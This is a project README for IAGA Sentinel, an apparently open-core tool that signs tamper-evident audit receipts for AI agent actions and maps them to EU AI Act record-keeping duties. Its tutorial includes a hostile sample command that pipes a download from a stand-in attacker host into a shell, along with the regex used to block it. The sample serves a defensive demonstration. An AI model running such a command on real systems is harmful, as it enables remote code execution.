<h1 align="center">IAGA Sentinel</h1>

<p align="center">
  <strong>The EU AI Act conformity evidence layer for AI agents.</strong>
</p>

<p align="center">
  Cryptographically signed, replay-verifiable, EU-sovereign proof of every action an agent takes, mapped to AI Act Article 12 and Annex IV.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/version-1.4.0-0f9d6b?style=flat-square" alt="version" />
  <img src="https://img.shields.io/badge/license-BUSL--1.1-0f9d6b?style=flat-square" alt="license" />
  <img src="https://img.shields.io/badge/EU%20AI%20Act-Art.%2012%20and%20Annex%20IV-0B0F0E?style=flat-square" alt="EU AI Act Article 12 and Annex IV" />
  <img src="https://img.shields.io/badge/tests-275%20passing-0f9d6b?style=flat-square" alt="tests" />
  <img src="https://img.shields.io/badge/Rust-stable-0B0F0E?style=flat-square" alt="Rust" />
</p>

<p align="center">
  <a href="#what-iaga-sentinel-is">What IAGA Sentinel is</a> ·
  <a href="#eu-ai-act-mapping">EU AI Act mapping</a> ·
  <a href="#quickstart">Quickstart</a> ·
  <a href="#features">Features</a> ·
  <a href="#architecture">Architecture</a> ·
  <a href="#documentation">Docs</a> ·
  <a href="#status">Status</a>
</p>

<p align="center">
  <img src="media/iaga-sentinel-promo.gif" alt="IAGA Sentinel, signed tamper-evident audit for AI agents" width="760" />
</p>

---

## What IAGA Sentinel is

IAGA Sentinel (repository: IAGA-Sentinel) sits next to your AI agents and answers the one question the agent itself cannot. Agents now touch the shell, the filesystem, databases, third-party APIs, and secrets. When a regulator, an auditor, or your own DPO asks you to prove what an agent did, and to prove the record was not altered after the fact, most teams have nothing to show. IAGA Sentinel produces that proof. Every governance verdict becomes an Ed25519-signed receipt linked into a Merkle append-log, verifiable offline, bit-exact on replay. The record is structured to line up with what the EU AI Act asks for in Article 12, automatic event logging over the system lifetime, and it feeds the Annex IV technical documentation a high-risk system needs by 2 August 2026.

> [!IMPORTANT]
> Today IAGA Sentinel enforces softly and certifies hard. The signed evidence and the replay are real and verifiable now, from a clean checkout. Authoritative kernel-level enforcement (eBPF/LSM) is not in this open build; it lives on the Enterprise roadmap, and `iaga kernel status` says so by reporting `authoritative: no`. Until that ships, the value here is the proof, not the block. We do not market enforcement we do not provide.

> [!TIP]
> The proof does not depend on us. Anyone can verify a receipt chain offline against its Merkle root, with no call home and no trust in IAGA required. A standalone `iaga-verify` tool, with no database and no IAGA binary, runs exactly that check. The evidence is cryptographic, not testimonial. The open build is BUSL-1.1 that converts to Apache-2.0, so you can run it air-gapped and keep it even if IAGA disappears. For EU teams that is sovereignty by construction: the evidence stays in your hands, with no CLOUD Act exposure.

IAGA Sentinel is a layer, not a replacement. It records signed evidence next to the agent stack you already run. Point any SDK at the HTTP sidecar (`POST /v1/inspect`), or run the MCP proxy to sign every tool call between an MCP client and its server. Whatever routes or enforces underneath, the evidence layer goes on top of it. The signed evidence can also flow into your OpenTelemetry stack as spans, so it lands next to the rest of your observability.

Under the hood it is three things in one binary, and the kernel is the mechanism that generates the evidence, not the headline.

1. A kernel. IAGA Sentinel can sit below the agent SDK. Process launches go through `iaga run`, which consults the governance pipeline before spawning. The 0.4.0 HTTP sidecar still works for SDK-aware agents; the kernel is the chokepoint for everything else. A generic policy kernel stops an action. IAGA Sentinel also leaves a signed, regulator-readable record that it did.
2. A signed log. Every governance verdict produces an Ed25519-signed receipt linked to the previous one in a Merkle append-log per run. Replay verifies the chain bit-exact and detects policy drift. The signer is a pluggable trait (`LocalDiskSigner` ships in the open build), and receipts can optionally capture the pipeline inputs that drove each verdict so a run can be re-executed against the current policy.
3. A reasoning brain. Optional ML models (ONNX, opt-in) emit evidence, never verdicts. The deterministic policy decides; ML produces scores the policy can read. Receipts embed the SHA-256 of every model that touched the decision.

All of it is driven by APL: a typed DSL with deterministic tree-walk evaluation and a Hindley-Milner type checker, loadable as a `--policy` overlay on top of the YAML profile system, with an optional WASM codegen path.

Also in the open build: a pluggable `Signer` trait with filesystem BYOK, optional drift-replay capture (`iaga replay --re-execute`), offline Sigstore and SBOM plugin attestation (`iaga plugins verify`), the APL Hindley-Milner type checker (`iaga policy check`) with an optional WASM codegen path (`iaga policy compile`), a standalone offline receipt verifier (`iaga-verify`), optional OpenTelemetry receipt export (`otel-receipts`), and Ed25519-signed plugin manifests (`iaga plugins sign-manifest`). Optional capabilities are feature-flagged off by default; the binary behaves identically until you opt in.

The 1.4.0 release expands the public integration surface in a serious way: the repo now ships first-class adapter examples for Claude Code, Claude Agent SDK, OpenAI, OpenAI Agents, Vercel AI, LangChain, LangGraph, CrewAI, AutoGen, LlamaIndex, MCP, Microsoft Agent Framework, and PydanticAI, plus a lightweight Rust integrations crate (`iaga-sentinel-integrations`) that mirrors the public `POST /v1/inspect` contract over async HTTP. The earlier hardening stays part of that same public surface: open-build receipts carry `is_authoritative: false`, receipt OpenTelemetry spans expose `iaga.receipt.id` / `iaga.chain.head` / `iaga.policy.verdict`, and `iaga run` scrubs 23 known secret-bearing environment variables (cloud and model-provider credentials, registry tokens, the signing-key path) from every governed child process, extendable via a TOML denylist at `IAGA_SENTINEL_ENV_DENYLIST`. Existing receipt chains still verify unchanged.

---

<p align="center">
  <img src="media/hero.gif" alt="IAGA Sentinel: signed, tamper-evident audit for AI agents" width="640" />
</p>

## EU AI Act mapping

The open build demonstrates the record-keeping and integrity obligations directly. The dossier-shaped obligations (Annex IV documents, qualified signatures, incident notifications) are Enterprise work and are labelled as such. Nothing in this table is sold as shipping in the open build unless the status says so.

| Obligation | Mechanism in IAGA Sentinel | Status |
|---|---|---|
| Article 12, automatic event logging over the system lifetime | Ed25519-signed receipt per verdict, Merkle append-log per run | Ships in the open build, verifiable offline |
| Integrity of records | `iaga replay <run_id> --verify-only`, bit-exact replay, drift detection | Ships in the open build |
| Documented risk controls | APL typed policies plus the Hindley-Milner type checker (`iaga policy check`) | Ships in the open build |
| Article 11 plus Annex IV technical documentation | dossier generation from the receipt chain | Enterprise, roadmap |
| Records with legal weight (eIDAS) | qualified signatures via a Trust Service Provider | Enterprise, roadmap |
| Article 72, post-market monitoring | continuous drift monitoring | Enterprise (the open build ships the drift-replay primitive, not the monitoring product) |
| Article 73, serious incident reporting | AI Office notification generation | Enterprise, roadmap |

The article-by-article mapping across the AI Act, GDPR, and DORA, and what Enterprise turns each obligation into, is in [`ENTERPRISE.md`](ENTERPRISE.md).

---

## Quickstart

### Install + start

```bash
cargo install --path crates/iaga-sentinel-core

# Default SQLite. Add --seed-demo to load the demo agents + workspaces.
iaga serve --seed-demo
```

### CLI flow (no auth)

```bash
# Path to a JSON file (camelCase keys, see note below)
iaga inspect ./payload.json

# Launch a child process under the governance pipeline
iaga run --agent-id openclaw-builder-01 -- python my_agent.py

# Replay the signed receipt chain
iaga replay --list
iaga replay <run_id>
iaga replay <run_id> --verify-only      # signatures + Merkle links only
iaga replay <run_id> --re-execute       # 1.2: surface drift-replay capture
                                        # (set IAGA_SENTINEL_RECEIPT_CAPTURE=1 on serve)

# Test an APL policy file
iaga policy lint crates/iaga-sentinel-apl/examples/no_pii_egress.apl
iaga policy test crates/iaga-sentinel-apl/examples/no_pii_egress.apl \
    --context crates/iaga-sentinel-apl/examples/sample_context.json

# 1.2: Hindley-Milner type-check (always available)
iaga policy check crates/iaga-sentinel-apl/examples/no_pii_egress.apl

# 1.2: compile APL to a WASM module (requires --features apl-wasm)
iaga policy compile policy.apl --output policy.wasm

# 1.2: verify a plugin's Sigstore bundle + SBOM (requires --features plugin-attestation)
iaga plugins verify ./plugins/my-plugin.wasm

# Inspect kernel + reasoning posture
iaga kernel status
iaga reasoning info

# Load an APL bundle as a live overlay on top of YAML
iaga serve --policy crates/iaga-sentinel-core/examples/policies/strict.apl
```

### HTTP API flow

```bash
# Generate an API key once
iaga gen-key --label my-app
# -> Key: iaga_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

# Inspect via HTTP. Auth header is `Authorization: Bearer <key>`.
# Payload uses camelCase: agentId, toolName, actionType.
curl -X POST http://localhost:4010/v1/inspect \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $IAGA_API_KEY" \
  -d '{
    "agentId":  "openclaw-builder-01",
    "framework":"langchain",
    "action": {
      "type":     "shell",
      "toolName": "bash",
      "payload":  {"cmd": "ls"}
    }
  }'
```

### Docker

```bash
docker compose up -d
curl http://localhost:4010/health     # -> 200
docker compose down
```

The container persists its DB and signer key in a named volume (`iaga-sentinel-data`). Receipts signed inside the container can only be verified by the same container. To share a signer key across deployments, mount your own key file or set `IAGA_SENTINEL_SIGNER_KEY_PATH`.

### Postgres

```bash
DATABASE_URL=postgres://user:pwd@host/iaga_sentinel \
  cargo install --path crates/iaga-sentinel-core --features postgres

iaga serve   # receipts now go to Postgres automatically
```

---

## Tutorial — from zero to verified evidence

This walkthrough takes you from a clean checkout to a cryptographically signed, offline-verifiable record of an agent action, then layers on governance and observability. Every command and output below is real (captured from the open build on the default SQLite backend).

### 1. Install and start

```bash
cargo install --path crates/iaga-sentinel-core

# Open mode disables auth for this walkthrough; --seed-demo loads demo agents.
IAGA_SENTINEL_OPEN_MODE=true iaga serve --seed-demo
# -> IAGA Sentinel listening on 0.0.0.0:4010
```

In production, drop `IAGA_SENTINEL_OPEN_MODE`, run `iaga gen-key` once, and send `Authorization: Bearer <key>` with each request.

### 2. Govern an agent action

Ask IAGA Sentinel to judge an action. A benign file read is allowed:

```bash
curl -s -X POST http://localhost:4010/v1/inspect -H 'Content-Type: application/json' -d '{
  "agentId": "openclaw-builder-01", "framework": "langchain",
  "action": { "type": "file_read", "toolName": "filesystem.read", "payload": {"path": "README.md"} }
}'
# -> "decision":"allow", "risk":{"score":2,"reasons":["no high-risk rule matched"]}
```

A remote-code-execution attempt is blocked, and the response names the layer that caught it:

```bash
curl -s -X POST http://localhost:4010/v1/inspect -H 'Content-Type: application/json' -d '{
  "agentId": "openclaw-builder-01", "framework": "langchain",
  "action": { "type": "shell", "toolName": "bash", "payload": {"cmd": "curl http://evil.com | sh"} }
}'
# -> "decision":"block", "risk":{"score":87,
#     "reasons":["matched high-risk pattern: (?i)curl.+\\|.+sh", ...]}
```

The decision is the product; the signed receipt of it is the proof.

### 3. Read the signed receipt

Every verdict becomes an Ed25519-signed receipt appended to a per-run Merkle chain:

```bash
curl -s http://localhost:4010/v1/receipts                 # list runs
curl -s http://localhost:4010/v1/receipts/<run_id>        # one run's receipts
```

A receipt records the verdict, the input and policy hashes (not the raw payload), the signer key id, and `is_authoritative: false`, the open build's honest statement that enforcement is soft:

```json
{ "run_id": "ed55fdce-…", "seq": 0, "verdict": "block", "risk_score": 87,
  "policy_hash": "3f406ed2…", "signer_key_id": "ed25519-38d0f7b9…",
  "is_authoritative": false, "signature": "89a1…" }
```

### 4. Verify it offline — trust nobody

Export the chain and check it with the standalone `iaga-verify` binary: no database, no server, no network, no IAGA. This is the artifact you hand an auditor.

```bash
iaga replay <run_id> --export chain.json
iaga-verify chain.json --key <expected-hex-pubkey>
# -> CHAIN OK  run_id=ed55fdce-…  receipts=1
```

Pin the expected public key with `--key`; without it the verifier falls back to the key embedded in the export and prints a loud, self-asserted warning. Build that ~3 MB verifier reproducibly:

```bash
cargo build --release -p iaga-sentinel-verify --no-default-features --features verify-only
```

<p align="center">
  <img src="media/loop-3.gif" alt="A signed receipt linked into a Merkle chain, verifiable offline" width="640" />
</p>

### 5. Govern a real process launch

`iaga run` consults the same pipeline before spawning a child process, and produces a receipt for the launch. If the policy blocks it, the child never starts:

```bash
iaga run --agent-id openclaw-builder-01 -- python my_agent.py
```

When a launch is allowed, IAGA Sentinel scrubs 23 known secret-bearing variables (cloud and model-provider credentials, registry tokens, the receipt signing-key path) from the child's environment — even if passed explicitly — so a governed agent never inherits host secrets. Extend the denylist with a TOML file:

```bash
# deny.toml:  deny = ["MY_SECRET", "INTERNAL_TOKEN"]
IAGA_SENTINEL_ENV_DENYLIST=./deny.toml iaga run --agent-id a -- ./my-tool
```

### 6. Write a policy in APL

APL is a typed, deterministic policy DSL. Load a bundle as a stricter-wins overlay on top of the YAML profiles — APL can tighten a verdict, never relax it:

```bash
iaga policy check my_policy.apl                       # Hindley-Milner type check (always available)
iaga policy test  my_policy.apl --context ctx.json    # dry-run against a JSON context
iaga serve --seed-demo --policy my_policy.apl         # load it live
```

<p align="center">
  <img src="media/loop-2.gif" alt="An APL policy evaluating an agent action to allow, review, or block" width="640" />
</p>

### 7. Stream the evidence to OpenTelemetry

Build with `--features otel-receipts` and every signed receipt also surfaces as an OTel span on `/v1/telemetry/spans`, carrying the keys `iaga.receipt.id`, `iaga.chain.head`, `iaga.policy.verdict`, and `iaga.is_authoritative` — so your existing observability stack ingests the evidence next to everything else. It stays in the in-process feed; nothing is pushed to a remote collector in this build.

### 8. Bring your own reasoning (optional)

Build with `--features ml`, point `IAGA_SENTINEL_REASONING_MODELS` at your ONNX models, and the reasoning plane emits scores the policy can read. ML produces evidence, never the verdict; receipts embed the SHA-256 of every model that touched the decision.

### What makes it different

- **Proof, not testimony.** Ed25519 + Merkle receipts, verifiable offline against a root, with no call home.
- **Honest posture.** Soft enforcement is stated in the evidence itself (`is_authoritative: false`); `iaga kernel status` reports `authoritative: no`. We do not market enforcement we do not provide.
- **Sovereign by construction.** Runs air-gapped; BUSL-1.1 converts to Apache-2.0; the evidence stays in your hands, with no CLOUD Act exposure.
- **EU AI Act-shaped.** The receipt lines up with Article 12 logging and feeds the Annex IV technical documentation a high-risk system needs by 2 August 2026.

---

## Features

Cargo features on `iaga-sentinel-core`:

| Feature      | Default | Adds                                                                  |
|--------------|---------|------------------------------------------------------------------------|
| `sqlite`     | ✅      | SQLite backend for audit + receipts.                                   |
| `postgres`   | ❌      | Postgres backend.                                                      |
| `receipts`   | ✅      | Ed25519-signed Merkle-chained receipts (M2).                           |
| `apl`        | ✅      | Agent Policy Language parser + evaluator + `iaga policy ...` (M3).    |
| `reasoning`  | ✅      | Reasoning plane scaffold + `iaga reasoning info` (M3.5).              |
| `ml`         | ❌      | `tract-onnx` ML backend; opt-in, +~5 MB binary, +~2 min cold compile.  |
| `kernel`     | ✅      | Enforcement kernel + `iaga run` + `iaga kernel status` (M4).         |
| `linux-bpf`  | ❌      | Linux eBPF/LSM scaffold + ringbuf API. Real Aya-rs loader lives in IAGA Sentinel Enterprise. |
| `plugin-attestation` | ❌ | Offline Sigstore bundle + CycloneDX SBOM verify + `iaga plugins verify` (1.2). |
| `apl-wasm`   | ❌      | APL to WASM codegen MVP + `iaga policy compile` (1.2). The Hindley-Milner type checker (`iaga policy check`) is always on, no feature needed. |
| `otel-receipts` | ❌ | Emit each signed receipt as an OpenTelemetry span on `/v1/telemetry/spans` and `/v1/telemetry/export`, so any OTel stack ingests the evidence. The span includes `iaga.receipt.id`, `iaga.chain.head`, `iaga.policy.verdict`, and `iaga.is_authoritative`. No new dependency. |
| `plugin-manifest-signing` | ❌ | Ed25519-signed plugin manifests verified at load against trusted keys, plus `iaga plugins sign-manifest` and `verify-manifest` (1.3). Orthogonal to `plugin-attestation`. |

`default = ["demo", "sqlite", "receipts", "apl", "reasoning", "kernel"]`.

The standalone verifier `iaga-verify` (crate `iaga-sentinel-verify`) is a separate, dependency-light binary. Export a run with `iaga replay <run_id> --export run.json`, then `iaga-verify run.json --key <hex>` checks the Ed25519 signatures and the Merkle chain offline, with no database and no IAGA binary. It is the artifact you hand an auditor. Build the slim verifier reproducibly with `cargo build --release -p iaga-sentinel-verify --no-default-features --features verify-only`.

---

## Architecture

12 layers of defense in depth, organized into 7 architectural pillars:

1. Enforcement Kernel: `crates/iaga-sentinel-kernel/` (M4 scaffold plus `UserspaceKernel` cross-platform soft enforcement; real eBPF/LSM loader plus macOS ES plus Windows ETW/WFP backends in IAGA Sentinel Enterprise).
2. Signed Receipts: `crates/iaga-sentinel-receipts/` (M2).
3. Agent Policy Language: `crates/iaga-sentinel-apl/` (M3 tree-walk plus M6 live overlay plus 1.2 Hindley-Milner type checker; 1.2 WASM codegen MVP behind the `apl-wasm` feature, full coverage in 1.3).
4. Attested Plugins: supply-chain integrity. 1.2 ships the offline Sigstore plus SBOM CycloneDX primitive behind the `plugin-attestation` feature; private hosted marketplace plus supply-chain SLA plus signed threat-intel feed in Enterprise.
5. Governance Mesh: single-cluster baseline plus tier-2 multi-region active-active in Enterprise.
6. Visual Plane: the operator dashboard served at `/` (`crates/iaga-sentinel-core/src/dashboard/`).
7. Probabilistic Reasoning: `crates/iaga-sentinel-reasoning/` (M3.5 scaffold plus `tract` backend plus BYO ONNX; curated ML library in Enterprise).

Workspace layout:

```
iaga-sentinel/
├── crates/
│   ├── iaga-sentinel-core/          # pipeline, server, CLI, AppState
│   ├── iaga-sentinel-receipts/      # Ed25519 + Merkle log + replay
│   ├── iaga-sentinel-apl/           # APL parser + evaluator
│   ├── iaga-sentinel-reasoning/     # ML evidence (tract-onnx behind `ml`)
│   ├── iaga-sentinel-kernel/        # cross-platform launcher + eBPF scaffold
│   ├── iaga-sentinel-verify/        # standalone offline receipt verifier
│   └── iaga-sentinel-integrations/  # shared adapter contract + async HTTP client
├── sdks/                    # Python + TypeScript SDKs and framework adapters
├── examples/integrations/   # copy-paste adapter examples (15 frameworks)
├── docs/adr/                # 18 ADRs (0001 to 0019, no 0009)
├── media/                   # hero assets
└── CHANGELOG.md             # release notes
```

---

## Integrations

Put IAGA Sentinel in the loop of any agent framework — one signed receipt per
tool call. Adapters live in the SDKs (`sdks/python`, `sdks/typescript`) with
copy-paste examples in **[`examples/integrations/`](examples/integrations/)**.

Shipped: Custom (`@governed`), LangChain, LangGraph (Py/JS), LlamaIndex,
Pydantic AI, OpenAI Agents SDK, CrewAI, AutoGen, Microsoft Agent Framework,
OpenAI (Py/TS), Vercel AI SDK, MCP (`GovernedTool` + `iaga proxy`), Claude Code
(`PreToolUse` hook) and the Claude Agent SDK. Each is cooperative governance
(`allow` / `review` / `block`, fail-open-by-default transport); a Rust client
crate (`iaga-sentinel-integrations`) speaks the same wire contract.

The Python adapters are tested both with dependency-free fakes (CI) and against
the **real** framework libraries (`sdks/python/tests/e2e/`). See the support
matrix and per-framework guides in
**[`examples/integrations/README.md`](examples/integrations/README.md)**.

---

## Documentation

- Release notes: [`CHANGELOG.md`](CHANGELOG.md)
- Architectural decisions:
  - [ADR 0001: Workspace split](docs/adr/0001-workspace-split.md)
  - [ADR 0002: License and scope decisions](docs/adr/0002-open-source-license-and-scope.md)
  - [ADR 0003: Signed receipts design](docs/adr/0003-signed-receipts-design.md)
  - [ADR 0004: APL MVP](docs/adr/0004-apl-mvp.md)
  - [ADR 0005: Reasoning plane MVP](docs/adr/0005-reasoning-plane-mvp.md)
  - [ADR 0006: Kernel MVP](docs/adr/0006-kernel-mvp.md)
  - [ADR 0007: M5 hardening + RC posture](docs/adr/0007-m5-hardening-rc.md)
  - [ADR 0008: APL as live policy engine](docs/adr/0008-apl-as-live-policy-engine.md)
  - [ADR 0010: OSS to Enterprise boundary clarification](docs/adr/0010-oss-enterprise-boundary.md)
  - [ADR 0011: `Signer` trait + `LocalDiskSigner` (1.2)](docs/adr/0011-signer-trait-and-local-disk.md)
  - [ADR 0012: Drift replay additive (1.2)](docs/adr/0012-drift-replay-additive.md)
  - [ADR 0013: Plugin Sigstore + SBOM attestation (1.2)](docs/adr/0013-plugin-attestation.md)
  - [ADR 0014: APL HM type checker + WASM codegen scaffolding (1.2)](docs/adr/0014-apl-wasm-and-types.md)
  - [ADR 0015: Standalone receipt verifier + run export (1.3)](docs/adr/0015-standalone-receipt-verifier.md)
  - [ADR 0016: OpenTelemetry receipt export (1.3)](docs/adr/0016-otel-receipt-export.md)
  - [ADR 0017: Ed25519 signed plugin manifests (1.3)](docs/adr/0017-signed-plugin-manifests.md)
  - [ADR 0018: Conformance closure, receipt `is_authoritative` + OTel keys + env scrub](docs/adr/0018-1.3-conformance-closure.md)
- Security and vulnerability reporting: [`SECURITY.md`](SECURITY.md)
- Data handling and privacy: [`DATA_HANDLING.md`](DATA_HANDLING.md)
- Contributing: [`CONTRIBUTING.md`](CONTRIBUTING.md)

---

## Status

The open build is shipped and tested: 275/275 default tests pass, clippy `--all-targets -D warnings` clean. The current release is 1.4.0; release notes are in [`CHANGELOG.md`](CHANGELOG.md).

What is intentionally honest about the posture:

- `iaga kernel status` reports `authoritative: no (soft enforcement)` on `UserspaceKernel`. Authoritative kernel-level enforcement (the Aya-rs eBPF/LSM loader on Linux) is not in the open build; it lives on the Enterprise side. We do not market enforcement we do not yet provide. The same honesty is recorded inside the evidence: every open-build receipt carries `is_authoritative: false`.
- `iaga reasoning info` reports `engine: noop` unless models are configured. The reasoning framework, the `TractEngine`, and BYO ONNX are in the open build. The curated ML model library (intent-drift, prompt-injection, anomaly-seq, pre-trained and signed) lives in Enterprise.
- APL is tree-walking, fully deterministic, and replay-safe. The Hindley-Milner type checker is always available via `iaga policy check`. The WASM codegen path (`apl-wasm` feature) covers literal and boolean, numeric, comparison expressions; the tree-walk evaluator remains canonical for the full APL surface. Full WASM coverage with host imports for Path, Call, and Membership is not in the open build today.
- macOS Endpoint Security and Windows ETW/WFP kernel backends, the governance mesh, native KMS SDK signers (AWS KMS, Azure Key Vault, HashiCorp Vault, PKCS#11), and GPU ML live on the Enterprise side. The boundary is documented in [`docs/adr/0010-oss-enterprise-boundary.md`](docs/adr/0010-oss-enterprise-boundary.md).

---

## Community vs Enterprise

IAGA Sentinel has an open build and a commercial Enterprise edition. The open build is the source-verifiable evidence core in this repository. Enterprise adds managed, platform-specific, and compliance-delivery capabilities for organizations that need operational support beyond the public runtime.

The public boundary is documented in [`docs/adr/0010-oss-enterprise-boundary.md`](docs/adr/0010-oss-enterprise-boundary.md).

### What ships in the open build today (this repository)

Verifiable by `git clone && cargo test --workspace && docker compose up -d`:

- 12-layer governance pipeline, single binary, single endpoint (`POST /v1/inspect`), 275/275 default tests passing.
- Signed action receipts, Ed25519 plus Merkle append-log per run, verifiable offline with `iaga replay <run_id> --verify-only`.
- Agent Policy Language (APL), a typed DSL with deterministic tree-walk evaluator, instruction budget, short-circuit evaluation. Try `iaga policy lint <file.apl>`.
- APL live overlay, load a bundle as `iaga serve --policy <file.apl>`. Stricter-wins merge with the YAML profile system.
- Reasoning plane scaffold, `iaga reasoning info`. Bring your own ONNX models via `--features ml` (`tract` backend, no native deps).
- Cross-platform `UserspaceKernel`, `iaga run -- <cmd>` spawns governed child processes on Linux, macOS, Windows.
- HTTP API with Bearer auth, `iaga gen-key` then call `POST /v1/inspect` with `Authorization: Bearer <key>`.
- SQLite and Postgres backends, switch by setting `DATABASE_URL=postgres://...` and building with `--features postgres`. Receipts go to the matching backend automatically.
- BYOK-ready signer, `IAGA_SENTINEL_SIGNER_KEY_PATH` points at any 32-byte Ed25519 key file, including one served by your KMS (AWS KMS, Azure Key Vault, HashiCorp Vault, on-prem HSM via the filesystem-mount pattern).
- Docker deployment, `docker compose up -d`, `/health` returns 200 within about 10 seconds on the first attempt.
- WASM plugin loading, `iaga plugins list` and `iaga plugins validate <file.wasm>`.

Run the smoke yourself. Every claim above is reproducible from a clean checkout.

### What Enterprise adds

Enterprise capabilities are not required to evaluate or run the open build. They are aimed at teams that need managed deployment, compliance workflows, identity integration, or platform-specific enforcement:

- Compliance evidence packaging for regulatory reviews.
- Qualified-signature and managed-key integrations.
- SSO, RBAC, multi-tenancy, and operational audit workflows.
- Native SIEM and managed deployment options.
- Platform-specific authoritative enforcement implementations.
- Curated model and threat-intelligence packages.
- Commercial support and deployment assistance.

### Open-core promise

The conceptual governance kernel is the open build: the receipt schema, the replay algorithm, the APL evaluator (with WASM codegen and the Hindley-Milner type checker in 1.2), the reasoning framework with BYO ONNX, the `UserspaceKernel` cross-platform soft enforcement, the `BpfKernel` Linux scaffold with its honest soft-enforcement posture, the BYOK signer pattern with the `Signer` trait and `LocalDiskSigner` (1.2), the Sigstore plus SBOM plugin attestation primitive (1.2), and drift replay (1.2). It is source available under **BUSL-1.1** with **Change License Apache-2.0** baked into the license itself: four years after publication every release converts automatically and irrevocably to Apache-2.0. No manual switch, no walk-back possible.

The implementations that require specialist engineering at scale live in IAGA Sentinel Enterprise: the real Aya-rs eBPF/LSM loader on Linux, the macOS Endpoint Security and Windows ETW/WFP backends, the governance mesh (single-cluster plus tier-2), the four native KMS SDK backends, and the curated ML model library. None of them shipped in 1.0 GA, so moving them to Enterprise does not violate the never-retroactively-remove-from-the-open-build covenant.

The full boundary is documented in [`docs/adr/0010-oss-enterprise-boundary.md`](docs/adr/0010-oss-enterprise-boundary.md) so future maintainers have a clear public reference.

### Why Enterprise exists

The open build proves the technical evidence path. Enterprise packages that evidence for teams that need repeatable operations, compliance handoff, managed integrations, or support obligations.

See [`ENTERPRISE.md`](ENTERPRISE.md) for the concise Enterprise overview. Contact: `info@iaga.tech`.

---

## License

The open build of IAGA Sentinel is source available under [**Business Source License 1.1**](LICENSE) with **Change License Apache-2.0** and a **Change Date** of four years from publication. What that means in plain English:

- You can run, copy, modify, and redistribute IAGA Sentinel freely for internal use, research, evaluation, and any non-production use.
- You can run IAGA Sentinel in production as long as your use does not consist of offering IAGA Sentinel itself to third parties as a hosted or managed service that exposes a substantial set of its features (see the Additional Use Grant in [`LICENSE`](LICENSE)). Building your own product on top of IAGA Sentinel for your customers is fine.
- Four years after each release is published, that specific release converts automatically and irrevocably to **Apache-2.0**. The conversion is written into the license itself, so it is not something we can walk back later.

Source available is not the same as OSI open source. The BUSL term is deliberate: it stops a third party from reselling IAGA Sentinel as a hosted service, while guaranteeing that every release becomes true open source on its Change Date.

IAGA Sentinel Enterprise is sold under a separate commercial agreement. The two share the same kernel, enterprise adds modules that live in a separate repository and are not covered by this license.

Repository: <https://github.com/EdoardoBambini/IAGA-Sentinel>
Contact: `info@iaga.tech`
